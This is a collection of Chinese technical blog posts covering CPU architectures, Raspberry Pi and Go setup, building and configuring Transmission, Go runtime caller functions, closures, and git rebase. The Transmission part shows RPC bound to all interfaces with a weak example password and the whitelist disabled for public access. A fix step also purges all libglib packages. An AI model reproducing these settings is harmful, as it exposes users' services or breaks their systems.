Machine，进阶精简指令集机器）\n\nARM可以说是一个异军突起的CPU架构，采用了RISC精简指令集，而且ARM发展到今天，架构上非常灵活，可以根据面向应用场景不同使用不同设计的内核，因此可以广泛用于嵌入式系统中，同时它高度节能的特性，目前各种移动设备中全都是它的身影。据统计，使用ARM架构的芯片年出货量高达200亿片，随着物联网时代降临，对于低功耗性ARM芯片需求量会发生爆炸性增长。\n\n\n\n## CPU架构问题总结\n\n##### CISC、RISC之争\n\n从上面得知，历史的长河里面，有过许许多多的CPU架构，它们之间的差异性非常大，经过时间、用户的检验，我们平常所接触到CPU架构也就剩X86和ARM两者，按照最核心的不同可以被分为两大类，即“复杂指令集”与“精简指令集”系统，也就是经常看到的“CISC”与“RISC”。\n\n\n\n要了解X86和ARM CPU架构，就得先了解CISC复杂指令集和RISC精简指令集 ，因为它们第一个区别就是X86使用了复杂指令集（CISC），而后者使用精简指令集（RISC）。造成他们使用不同该指令集的原因在于，面向的设备、对象、性能要求是不一样。\n\n手机SoC普遍都是采用ARM提供的核心作为基础，依据自身需求改变SoC的核心架构，而ARM正正是RISC精简指令集的代表人物。CPU巨头Intel、AMD所采用的X86架构已经沿用了数十年，是CISC复杂指令集的典型代表。\n\n\n\n##### 为什么x86不叫x32\n\nx86，x64，看似写法类似，但实际上代表了完全不同的含义。简单来说，x86指的是cpu的架构，x64是cpu位数。笼统的说，前者代表cpu的逻辑结构，后者是cpu运算能力。除了x86架构的cpu外，还有很多不同架构的cpu，其中最有名的就是IA架构，即intel安腾架构。两者之间的系统、软件不能通用。\n\n而x64的全称叫x86-64，也就是说x64是x86架构的64位cpu。\n\n\n\nx86架构中，最早的cpu是16位的，即8086，其前身还有8位的8008和4位的4004，但后两者是另外的架构。后出的80386已经升级到32位。\n\n这样就可以解释开始的问题了。x86是一种架构的命名，代表所有的该架构下的cpu，包括16位，32位，64位，将来也许会有128位。之所以用x86代表32位系统，是一种通俗用法罢了，是不严谨甚至有误的。由于16位cpu早已淘汰不用了，而在64位出来前，32位cpu占据了很长一段时间，所以习惯性的用x86代表32位cpu。而x64是一个简写，告诉大家的是：我是x86架构中的64位cpu。\n\n\n\n如果严谨的按命名规则来看，现在的x86应该叫x86-32，简称x32。以前16位的8086则应该叫x86-16，简称x16。因此，x86不叫x32，只是一种习称，一种误称。\n\nIA架构下的cpu命名则比较严谨，32位就叫IA32，64就叫IA64。\n\n\n\n##### mac上可以玩iphone的app吗\n\nXcode自带的iOS模拟器并不是真正意义上的模拟器,他没有运行arm指令的能力,之所以你可以用它调试你开发的app,是因为调试目标选为模拟器的时候,Xcode生成的代码是x86/x86_64架构用的,具体是x86还是x86_64取决于你选的机型,如果你选iPhone5S之前的机型的模拟器,那就是x86.\n\n\n\n换个说法,就是这个模拟器并没有模拟arm处理器等硬件,只是在x86/x86_64架构上提供了和iOS一样的接口的SDK,其接口的行为也和iOS上几乎一样.之所以说几乎一样,是因为真的有不一样的地方.\n\n\n\n好了,到这里你知道了,这个模拟器其实就是一个app,模拟下iOS的行为,那些跑在里面的app,其实也都是x86/x86_64的, 而app store上上架的那些app, 都不会包含x86/x86_64架构,只支持arm架构,所以无论如何你也没办法在电脑上运行他们.\n\n至于为什么android可以,因为android是开源的,使用的处理器架构也是资料丰富,所以可以开发出来真正的可以虚拟arm处理器以及其它硬件的模拟器,这样就可以在电脑上运行android app了.而iPhone, iTouch, iPad使用的处理器估计目前还没有谁能真正模拟出来, 就算有这种能人, 他也未必有做模拟器的想法,就算有这个想法,那也未必有那个胆量.\n\n\n\n最后说个常识:\n\n在开发iOS app接入第三方sdk的时候, 偶尔会遇到模拟器无法正确link, 但是真机可以的情况.这其实就是因为sdk提供商提供的sdk,根本就没支持x86/x86_64,鄙视\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["cpu"],"categories":["系统"]},{"title":"在树莓派arm上运行golang和c程序","url":"%2Fp%2F21dd607c.html","content":"\n\n## 树莓派基础设置\n\n##### 树莓派修改键盘布局\n\n```\nsudo dpkg-reconfigure keyboard-configuration\n```\n\n选通用的101键PC键盘\n\n在键盘layout选择中，选Other\n\n然后在选项中，选English(US)\n\n再选English(US, alternative international)\n\n一直下一步,最后重启\n\n```\nsudo reboot\n```\n\n\n\n##### 树莓派修改启动进入终端界面\n\n```\n\nsudo raspi-config\n\nboot option ->console\n\n```\n<!-- more -->\n\n\n##### 树莓派开启ssh\n\n```\n\nsudo raspi-config\n\nSelect Interfacing Options\n\nNavigate to and select SSH\n\nChoose Yes\n\nSelect Ok\n\nChoose Finish\n\n\nsudo systemctl enable ssh\n\nsudo systemctl start ssh\n```\n\n\n\n## 编译golang为arm可执行程序\n\n\n\n```\nGOOS=linux GOARCH=arm GOARM=6 go build -v\n```\n\n\n\nGOARM=5: use software floating point; when CPU doesn't have VFP co-processor\n\nGOARM=6: use VFPv1 only; default if cross compiling; usually ARM11 or better cores (VFPv2 or better is also supported)\n\nGOARM=7: use VFPv3; usually Cortex-A cores\n\n\n\n## 编译arm可执行程序\n\n缺少的程序直接使用`包管理`下载即可\n\n##### 解决下载软件包连接不上的问题 connect to mirrors.opencas.cn....\n\n   ```\nsudo vim /etc/apt/sources.list \n   \n替换源为\n   \ndeb http://mirrors.shu.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi\n   \nsudo apt-get update&& sudo apt-get -y dist-upgrade&&sudo apt-get update \n   ```\n","tags":["树莓派"],"categories":["系统"]},{"title":"transmission编译安装和golang_rpc的调用","url":"%2Fp%2Fbf531b37.html","content":"\n### 1. mac编译transmission\n\n+ 下载项目\n\n```bash\ngit clone https://github.com/transmission/transmission Transmission\ncd Transmission\ngit submodule update --init\nXcode project file (Transmission.xcodeproj) for building in Xcode. \n```\n\n\n\n+ 在 xcode中编译\n\n  下图第一个是编译 mac 的应用程序,  第二个是可以编译 transmission-daemon 程序\n\n![1](transmission/1.png)\n\n<!-- more -->\n\n\n\n### 2. ubuntu 16.04编译transmission\n\n```bash\n$ sudo apt-get install cmake make build-essential automake autoconf libtool pkg-config intltool libcurl4-openssl-dev libglib2.0-dev libevent-dev libminiupnpc-dev libgtk-3-dev libappindicator3-dev gettext libssl-dev\n\n$ git clone https://github.com/transmission/transmission Transmission\n$ cd Transmission\n$ git submodule update --init\n$ mkdir build\n$ cd build\n$ cmake ..\n$ make\n$ sudo make install (make install DESTDIR=a)\n```\n\n安装完成后出现以下命令:\n\n![2](transmission/2.png)\n\n\n\n编译时遇到的问题:\n\n1. CMAKE_MAKE_PROGRAM is not set\n\n```\nsudo apt-get install gettext\nsudo apt-get install make \nsudo apt-get install libssl-dev\n```\n\n2. missing: CURL_LIBRARY CURL_INCLUDE_DIR\n\n```\nsudo apt-get install libcurl4-openssl-dev//ubuntu\nyum install curl-devel//centos\n```\n\n3. autogen.sh: not found\n\n```\nsudo apt-get install autoconf\nsudo apt-get install automake\nsudo apt-get install libtool\n```\n\n4. transmission libevent 变成了event\n\n   把所有的依赖全部装一遍, 安装后删除build. 重新cmake一下\n\n5. undefined reference to `g_log_structured_standard`\n\n   ```bash\n   apt-get remove --purge libglib*\n   apt-get install libglib-2.x-y  # where x and y are whatever the package version says.\n   ```\n\n   \n\n\n\n### 3. transmission 介绍\n\n- transmission-cli： 独立的命令行客户端。\n- transmission-create： 用来建立.torrent种子文件的命令行工具。\n- transmission-daemon： 后台守护程序。\n- transmission-edit： 用来修改.torrent种子文件的announce URL。\n- transmission-remote： 控制daemon的程序。\n- transmission-show：查看.torrent文件的信息。\n\n\n\n1. 配置文件目录里面包含如下一些文件：\n\n- settings.json： 主要的配置文件，设置daemon的各项参数，包括RPC的用户名密码配置。它实际上是一个符号链接，指向的原始文件是/etc/transmission-daemon/settings.json。里面的参数解释可以参考官网的配置说明。\n- torrents/： 用户存放.torrent种子文件的目录,凡是添加到下载任务的种子，都存放在这里。.torrent的命名包含,种子文件本身的名字和种子的SHA1 HASH值。\n- resume/： 该存放了.resume文件，.resume文件包含了一个种子的信息，例如该文件哪些部分被下载了，下载的数据存储的位置等等。\n- blocklists/： 存储被屏蔽的peer的地址。\n- dht.dat： 存储DHT节点信息。\n\n\n\n配置主要是通过修改 `/var/lib/transmission-daemon/info/settings.json` 文件中的参数来实现的。 **注意**：在编辑 transmission 配置文件的时候，需要先关闭 daemon 进程，否则编辑的参数将会被恢复到原来的状态。\n\n\n\n2. RPC参数介绍: \n\n```\n{\n\"download-dir\": \"/down\", #下载目录的绝对路径\n\"incomplete-dir\": \"/down/temp\", #临时文件路径\n\"rpc-authentication-required\": true, #启用验证\n\"rpc-bind-address\": \"0.0.0.0\", #允许任何IP通过RPC协议访问\n\"rpc-enabled\": true, #允许通过RPC访问\n\"rpc-password\": \"123456\", #RPC验证密码（保存并启动后daemon会计算并替换为HASH值以增加安全性）\n\"rpc-port\": 9091, #RPC端口\n\"rpc-username\": \"transmission\", #RPC验证用户名\n\"rpc-whitelist\": \"*\", #RPC访问白名单\n\"rpc-whitelist-enabled\": false, #关闭白名单功能以便公网访问\n}\n```\n\n更多参数说明请见[官方Wiki](https://github.com/transmission/transmission/wiki/Editing-Configuration-Files)\n\n\n\n### 4. mac使用web界面控制transmission daemon\n\n\n\n+ 运行Xcode 编译好的客户端, 设置 Remote\n\n\n\n![2](transmission/3.png)\n\n\n\n\n\n在浏览器中访问`http://localhost:9091/transmission/web` 并输入设置的用户名及密码就可以看到如下界面\n\n![2](transmission/4.png)\n\n+ 运行Xcode编译好的transmission-daemon\n\n \n\n配置文件在 `/Users/liuwei/Library/Application\\ Support/transmission-daemon/settings.json` \n\n设置环境变量后 `export TRANSMISSION_WEB_HOME=/Users/liuwei/workspace/transmission/web`\n\n通过浏览器访问`http://localhost:9091/transmission/web`\n\n\n\n+ 访问外网ip错误\n\nunauthorized ip address403: ForbiddenUnauthorized IP Address.Either disable the IP address whitelist or add your address to it.If you're editing settings.json, see the 'rpc-whitelist' and 'rpc-whitelist-enabled' entries.If you're still using ACLs, use a whitelist instead. See the transmission-daemon manpage for details.\n\n\n\n```\ntransmission/.config/transmission-daemon/settings.json  \n\n\"rpc-whitelist-enabled\": true,  ture改成false。\n```\n\n\n\n### 5. golang通过rpc调用transmission\n\n\n\n+ rpc api\n\nhttps://github.com/transmission/transmission/blob/master/extras/rpc-spec.txt\n\n+ golang lib for Transmission API\n\nhttps://github.com/pyed/transmission","tags":["transmission"],"categories":["BitTorrent"]},{"title":"golang_runtime函数调用信息","url":"%2Fp%2F375281af.html","content":"\n\n函数的调用信息是程序中比较重要运行期信息, 在很多场合都会用到(比如调试或日志)。\n\nGo 语言 `runtime` 包的 `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` 等几个函数提供了获取函数调用者信息的方法.\n\n \n\n这几个函数的文档链接:\n\n- <http://golang.org/pkg/runtime/#Caller>\n\n- <http://golang.org/pkg/runtime/#Callers>\n\n- <http://golang.org/pkg/runtime/#FuncForPC>\n\n  \n\n## runtime.Caller的用法(常用)\n\n函数的签名如下:\n\n```\nfunc runtime.Caller(skip int) (pc uintptr, file string, line int, ok bool)\n```\n\n`runtime.Caller` 返回当前 `goroutine` 的栈上的函数调用信息. 主要有当前的`pc` 值和调用的文件和行号等信息. 若无法获得信息, 返回的 `ok` 值为 `false`.\n\n <!-- more -->\n\n其输入参数 `skip` 为要跳过的栈帧数, 若为 `0` 则表示 `runtime.Caller` 的调用者.\n\n*注意:由于历史原因, runtime.Caller 和 runtime.Callers 中的 skip 含义并不相同, 后面会讲到.*\n\n\n\n下面是一个简单的例子, 打印函数调用的栈帧信息:\n\n```\nfunc main() {\n\tfor skip := 0; skip < 3; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198453, file = caller.go, line = 10\n\t// skip = 1, pc = 4280066, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4289712, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n}\n```\n\n\n\n## runtime.Callers的用法\n\n函数的签名如下:\n\n```\nfunc runtime.Callers(skip int, pc []uintptr) int\n```\n\n`runtime.Callers` 函数和 `runtime.Caller` 函数虽然名字相似(多一个后缀`s`), 但是函数的参数/返回值和参数的意义都有很大的差异.\n\n\n\n`runtime.Callers` 把调用它的函数Go程栈上的程序计数器填入切片 `pc` 中. 参数 `skip` 为开始在 pc 中记录之前所要跳过的栈帧数, **若为 0 则表示 runtime.Callers 自身的栈帧, 若为 1 则表示调用者的栈帧**. 该函数返回写入到 `pc` 切片中的项数(受切片的容量限制).\n\n\n\n下面是 `runtime.Callers` 的例子, 用于输出每个栈帧的 `pc` 信息:\n\n```\nfunc main() {\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4304486 4198562 4280114 4289760]\n\t// skip = 1, pc = [4198562 4280114 4289760]\n\t// skip = 2, pc = [4280114 4289760]\n\t// skip = 3, pc = [4289760]\n}\n```\n\n输出新的 `pc` 长度和 `skip` 大小有逆相关性. `skip = 0` 为 `runtime.Callers` 自身的信息.\n\n这个例子比前一个例子多输出了一个栈帧, 就是因为多了一个 `runtime.Callers` 栈帧的信息 (前一个例子是没有 `runtime.Caller` 信息的(*注意:没有 s 后缀*)).\n\n\n\n## runtime.Callers 和 runtime.Caller 的异同\n\n因为前面2个例子为不同的程序, 输出的 `pc` 值并不具备参考性. 现在我们看看在同一个例子的输出结果如何:\n\n \n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456, file = caller.go, line = 10\n\t// skip = 1, pc = 4280962, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4290608, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4305334 4198635 4280962 4290608]\n\t// skip = 1, pc = [4198635 4280962 4290608]\n\t// skip = 2, pc = [4280962 4290608]\n\t// skip = 3, pc = [4290608]\n}\n```\n\n比如输出结果可以发现, `4280962` 和 `4290608` 两个 `pc` 值是相同的. 它们分别对应 `runtime.main` 和 `runtime.goexit` 函数.\n\n\n\n`runtime.Caller` 输出的 `4198456` 和 `runtime.Callers` 输出的 `4198635` 并不相同. 这是因为, 这两个函数的调用位置并不相同, 因此导致了 `pc` 值也不完全相同.\n\n\n\n最后就是 `runtime.Callers` 多输出一个 `4305334` 值, 对应`runtime.Callers`内部的调用位置.\n\n由于Go语言(Go1.2)采用分段堆栈, 因此不同的 `pc` 之间的大小关系并不明显.\n\n\n\n## runtime.FuncForPC 的用途\n\n函数的签名如下:\n\n```\nfunc runtime.FuncForPC(pc uintptr) *runtime.Func\nfunc (f *runtime.Func) FileLine(pc uintptr) (file string, line int)\nfunc (f *runtime.Func) Entry() uintptr\nfunc (f *runtime.Func) Name() string\n```\n\n\n\n其中 `runtime.FuncForPC` 返回包含给定 `pc` 地址的函数, 如果是无效 `pc` 则返回 `nil` .\n\n`runtime.Func.FileLine` 返回与 `pc` 对应的源码文件名和行号. 安装文档的说明, 如果`pc`不在函数帧范围内, 则结果是不确定的.\n\n`runtime.Func.Entry` 对应函数的地址. \n\n`runtime.Func.Name` 返回该函数的名称. \n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, _, _, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tp := runtime.FuncForPC(pc)\n\t\tfile, line := p.FileLine(0)\n\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  entry = %v\\n\", p.Entry())\n\t\tfmt.Printf(\"  name = %v\\n\", p.Name())\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456\n\t//   file = caller.go, line = 8\n\t//   entry = 4198400\n\t//   name = main.main\n\t// skip = 1, pc = 4282882\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//   entry = 4282576\n\t//   name = runtime.main\n\t// skip = 2, pc = 4292528\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//   entry = 4292528\n\t//   name = runtime.goexit\n\t\n\t\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t\tfor j := 0; j < n; j++ {\n\t\t\tp := runtime.FuncForPC(pc[j])\n\t\t\tfile, line := p.FileLine(0)\n\n\t\t\tfmt.Printf(\"  skip = %v, pc = %v\\n\", skip, pc[j])\n\t\t\tfmt.Printf(\"    file = %v, line = %d\\n\", file, line)\n\t\t\tfmt.Printf(\"    entry = %v\\n\", p.Entry())\n\t\t\tfmt.Printf(\"    name = %v\\n\", p.Name())\n\t\t}\n\t\tbreak\n\t}\n\t// Output:\n\t// skip = 0, pc = [4307254 4198586 4282882 4292528]\n\t//   skip = 0, pc = 4307254\n\t//     file = $(GOROOT)/src/pkg/runtime/runtime.c, line = 315\n\t//     entry = 4307168\n\t//     name = runtime.Callers\n\t//   skip = 0, pc = 4198586\n\t//     file = caller.go, line = 8\n\t//     entry = 4198400\n\t//     name = main.main\n\t//   skip = 0, pc = 4282882\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//     entry = 4282576\n\t//     name = runtime.main\n\t//   skip = 0, pc = 4292528\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//     entry = 4292528\n\t//     name = runtime.goexit\n}\n```\n\n\n\n根据测试, 如果是无效 `pc` (比如`0`), `runtime.Func.FileLine` 一般会输出当前函数的开始行号. 不过在实践中, 一般会用 `runtime.Caller` 获取文件名和行号信息, `runtime.Func.FileLine` 很少用到.\n\n\n\n## 定制的 CallerName 函数\n\n基于前面的几个函数, 我们可以方便的定制一个 `CallerName` 函数. 函数 `CallerName` 返回调用者的函数名/文件名/行号等用户友好的信息.\n\n\n\n```\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\tvar pc uintptr\n\tif pc, file, line, ok = runtime.Caller(skip + 1); !ok {\n\t\treturn\n\t}\n\tname = runtime.FuncForPC(pc).Name()\n\treturn\n}\n```\n\n其中在执行 `runtime.Caller` 调用时, 参数 `skip + 1` 用于抵消 `CallerName` 函数自身的调用.\n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v\\n\", skip)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  name = %v\\n\", name)\n\t}\n\t// Output:\n\t// skip = 0\n\t//   file = caller.go, line = 19\n\t//   name = main.main\n\t// skip = 1\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 220\n\t//   name = runtime.main\n\t// skip = 2\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 1394\n\t//   name = runtime.goexit\n}\n```\n\n\n\n## Go 语言中函数的类型\n\n在 Go 语言中, 除了语言定义的普通函数调用外, 还有闭包函数/init函数/全局变量初始化等不同的函数调用类型.\n\n为了便于测试不同类型的函数调用, 我们包装一个 `PrintCallerName` 函数. 该函数用于输出调用者的信息.\n\n```\nfunc PrintCallerName(skip int, comment string) bool {\n\tname, file, line, ok := CallerName(skip + 1)\n\tif !ok {\n\t\treturn false\n\t}\n\tfmt.Printf(\"skip = %v, comment = %s\\n\", skip, comment)\n\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\tfmt.Printf(\"  name = %v\\n\", name)\n\treturn true\n}\n```\n\n\n\n然后编写以下的测试代码(函数闭包调用/全局变量初始化/init函数等):\n\n```\nvar a = PrintCallerName(0, \"main.a\")\nvar b = PrintCallerName(0, \"main.b\")\n\nfunc init() {\n\ta = PrintCallerName(0, \"main.init.a\")\n}\n\nfunc init() {\n\tb = PrintCallerName(0, \"main.init.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.init.b[1]\")\n\t}()\n}\n\nfunc main() {\n\ta = PrintCallerName(0, \"main.main.a\")\n\tb = PrintCallerName(0, \"main.main.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.main.b[1]\")\n\t\tfunc() {\n\t\t\tb = PrintCallerName(0, \"main.main.b[1][1]\")\n\t\t}()\n\t\tb = PrintCallerName(0, \"main.main.b[2]\")\n\t}()\n}\n```\n\n输出结果如下:\n\n```\n// Output:\n// skip = 0, comment = main.a\n//   file = caller.go, line = 8\n//   name = main.init\n// skip = 0, comment = main.b\n//   file = caller.go, line = 9\n//   name = main.init\n// skip = 0, comment = main.init.a\n//   file = caller.go, line = 12\n//   name = main.init·1\n// skip = 0, comment = main.init.b\n//   file = caller.go, line = 16\n//   name = main.init·2\n// skip = 0, comment = main.init.b[1]\n//   file = caller.go, line = 18\n//   name = main.func·001\n// skip = 0, comment = main.main.a\n//   file = caller.go, line = 23\n//   name = main.main\n// skip = 0, comment = main.main.b\n//   file = caller.go, line = 24\n//   name = main.main\n// skip = 0, comment = main.main.b[1]\n//   file = caller.go, line = 26\n//   name = main.func·003\n// skip = 0, comment = main.main.b[1][1]\n//   file = caller.go, line = 28\n//   name = main.func·002\n// skip = 0, comment = main.main.b[2]\n//   file = caller.go, line = 30\n//   name = main.func·003\n```\n\n\n\n观察输出结果, 可以发现以下几个规律:\n\n- 全局变量的初始化调用者为 `main.init` 函数\n- 自定义的 `init` 函数有一个数字后缀, 根据出现的顺序进编号. 比如 `main.init·1` 和 `main.init·2` 等.\n- 闭包函数采用 `main.func·001` 格式命名, 安装闭包定义结束的位置顺序进编号.\n\n \n\n## 不同 Go 程序启动流程\n\n基于函数调用者信息可以很容易的验证各种环境的程序启动流程.\n\n我们需要建立一个独立的 `caller` 目录, 里面有三个测试代码.\n\n`caller/main.go` 主程序:\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n\t\"runtime\"\n)\n\nfunc main() {\n\t_ = PrintCallerName(0, \"main.main._\")\n}\n\nfunc PrintCallerName(skip int, comment string) bool {\n\t// 实现和前面的例子相同\n}\n\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\t// 实现和前面的例子相同\n}\n```\n\n`caller/main_test.go` 主程序的测试文件(同在一个`main`包):\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n)\n\nfunc TestPrintCallerName(t *testing.T) {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\tt.Fail()\n}\n```\n\n`caller/example_test.go` 主程序的包的调用者(在新的`main_test`包):\n\n```\npackage main_test\n\nimport (\n\tmyMain \".\"\n\t\"fmt\"\n)\n\nfunc Example() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := myMain.CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\t// Output: ?\n}\n```\n\n然后进入 `caller` 目录, 运行 `go run test` 可以得到以下的输出结果:\n\n```\nskip = 0, name = caller.TestPrintCallerName, file = caller/main_test.go, line = 10\nskip = 1, name = testing.tRunner, file = $(GOROOT)/src/pkg/testing/testing.go, line = 391\nskip = 2, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n--- FAIL: TestPrintCallerName (0.00 seconds)\n--- FAIL: Example (2.0001ms)\ngot:\nskip = 0, name = caller_test.Example, file = caller/example_test.go, line = 10\n\nskip = 1, name = testing.runExample, file = $(GOROOT)/src/pkg/testing/example.go, line = 98\nskip = 2, name = testing.RunExamples, file = $(GOROOT)/src/pkg/testing/example.go, line = 36\nskip = 3, name = testing.Main, file = $(GOROOT)/src/pkg/testing/testing.go, line = 404\nskip = 4, name = main.main, file = $(TEMP)/go-build365033523/caller/_test/_testmain.go, line = 51\nskip = 5, name = runtime.main, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\nskip = 6, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\nwant:\n?\nFAIL\nexit status 1\nFAIL    caller        0.254s\n```\n\n分析输出数据我们可以发现, 测试代码和例子代码的启动流程和普通的程序流程都不太一样.\n\n`测试代码`的启动流程:\n\n1. `runtime.goexit` 还是入口\n2. 但是 `runtime.goexit` 不在调用 `runtime.main` 函数, 而是调用 `testing.tRunner` 函数\n3. `testing.tRunner` 函数由 `go test` 命令生成, 用于执行各个测试函数\n\n`例子代码`的启动流程:\n\n1. `runtime.goexit` 还是入口\n2. 然后 `runtime.goexit` 调用 `runtime.main` 函数\n3. 最终 `runtime.main` **调用go test 命令生成的 main.main 函数**, 在 `_test/_testmain.go` 文件\n4. 然后调用 `testing.Main`, 改函数执行各个例子函数\n\n另外, 从这个例子我们可以发现, 我们自己写的 `main.main` 函数所在的 `main` 包也 可以被其他包导入. 但是其他包导入之后的 `main` 包里的 `main` 函数就不再是 `main.main` 函数了. 因此, 程序的入口也就不是自己写的 `main.main` 函数了.\n\n\n\n## 总结\n\nGo 语言 `runtime` 包的 `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` 等函数虽然看起来比较简单, 但是功能却非常强大.\n\n这几个函数不仅可以解决一些实际的工程问题 , 而且非常适合用于调试和分析各种Go程序的运行时信息.\n","tags":["golang"],"categories":["golang"]},{"title":"golang闭包的坑","url":"%2Fp%2F4c5612cb.html","content":"\n### 循环内goroutine使用闭包\n\n```\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func() {\n            fmt.Println(v)\n        }()                 \n    }                                                                             \n}\n```\n\n改进:\n\n```\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func(v string) {\n            fmt.Println(v)\n        }(v)      \n    }                                                                            \n}\n```\n\n<!-- more -->\n\n## 循环内闭包函数列表\n\n```\nfunc test() []func() {\n    var s []func()\n\n    for i := 0; i < 3; i++ {\n        s = append(s, func() {  \n            fmt.Println(&i, i)\n        })\n    }\n\n    return s    \n}\nfunc main() {\n    for _, f := range test() { \n        f()   \n    }\n}\n```\n\n改进:\n\n```\nfunc test() []func() {\n    var s []func()\n    \n    for i := 0; i < 3; i++ {\n        x := i                 \n        s = append(s, func() {\n            fmt.Println(&x, x)\n        })\n    }\n\n    return s\n}\nfunc main() {\n    for _, f := range test() {\n        f()\n    }\n}\n```\n\n\n\n### defer延迟调用闭包\n\n```\nfunc main() {\n    x, y := 1, 2\n\n    defer func(a int) { \n        fmt.Printf(\"x:%d,y:%d\\n\", a, y)  // y 为闭包引用\n    }(x) // 复制 x 的值\n\n    x += 100\n    y += 100\n    fmt.Println(x, y)\n}\n\n\n101 102\nx:1,y:102\n```\n","tags":["golang"],"categories":["golang"]},{"title":"不会rebase就等于没学过Git","url":"%2Fp%2Fb1718ace.html","content":"\n\n\n## 什么是rebase \n\nRebase对于很多人来说是一个很抽象的概念，也因此它的学习门槛就在于如何了解这个抽象的概念。对于rebase 比较恰当的比喻应该是「移花接木」，简单来讲把你的分支接到别的分支上，稍后我们用几个图来示范merge与rebase 的差异。\n\n\n\n了解rebase之前，我们必须了解什么是base。对Git的使用者而言，在分支中进行开发活动是稀松平常的事情，也因此在合并管理分支时，也就需要了解分支是在哪个时间点哪个提交点分出来的旁支，而长出旁支来的提交点，对于旁支来说就是base commit，也就是base。所以简单来说，rebase其实就是改变分支的base的功能。\n\n \n\n下图是在merge的情况会产生的版本演进的示意图，可以看到在新的分支中所做的变更，在合并之后，一并成为一个新的提交(commit 6)。而commit 1就是New Branch的base。\n\n![1](不会rebase就等于没学过Git/1.png)\n\n\n\n\n\n<!-- more -->\n\n而下图是rebase 的情况下会产生的版本演进的示意图。我们同样是在分支中进行开发的动作，但是在rebase时，与merge不同的是，Git会将分支上所做的变更先暂存起来，接着把newbase (或称新基准点)合并进来，最后直接将刚刚暂存起来的变更在分支上重演，这边用「重演」这个字眼是表示「**rebase不是将提交(commit)复制到分支上，而是将整个变更过程一个一个重新套用到分支上**」 ，也就因为如此commit 2'与commit 3'，才会有另外的'符号表示与原本的commit 2 , commit 3不同，这点可以从commit的SHA1凑值不同看出来，虽然变更的内容相同，但是commit编号是不同的。本文会在稍后利用范例演示一遍。\n\n![1](不会rebase就等于没学过Git/2.png)\n\n也就因为如此，所以rebase的行为就很像「移花接木」，以上图来说，就是把New Branch的变更整个接到Master上。这样的好处就是 commit 